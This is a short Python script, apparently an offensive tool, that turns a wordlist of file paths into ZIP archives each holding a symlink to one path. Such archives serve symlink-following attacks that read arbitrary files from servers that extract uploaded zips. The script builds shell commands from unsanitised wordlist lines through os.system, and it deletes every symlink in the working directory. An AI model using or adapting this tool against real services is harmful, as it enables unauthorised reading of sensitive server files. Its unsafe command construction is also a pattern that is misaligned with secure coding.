import os,sys
import argparse

#https://stackoverflow.com/questions/34270582/adding-file-to-existing-zipfile

def main():
    parser = argparse.ArgumentParser(
        description='ZIP symlink payload generator'
    )
    parser.add_argument('-f', '--file', type=str, required=True,help="Creates the ZIP payloads based on a wordlist")
    parser.add_argument('-g', '--get', type=str,help="Introduce the link filename to get the file to which it corresponds")
    args = parser.parse_args()
    if args.get is not None:
       path=open(args.file,"r").readlines()
       number=int(args.get.split("link")[1])
       print("The file is: "+str(path[number]))
    else:
       path=open(args.file,"r").readlines()
       j=0
       for i in path:
           os.system("ln -s "+i.strip()+" link"+str(j)+" 1>/dev/null 2>/dev/null")
           os.system("zip --symlinks link"+str(j)+".zip link"+str(j)+" 1>/dev/null 2>/dev/null")
           j+=1
       os.system("find . -type l -delete")
       print("[+] Payloads have been created")

main()
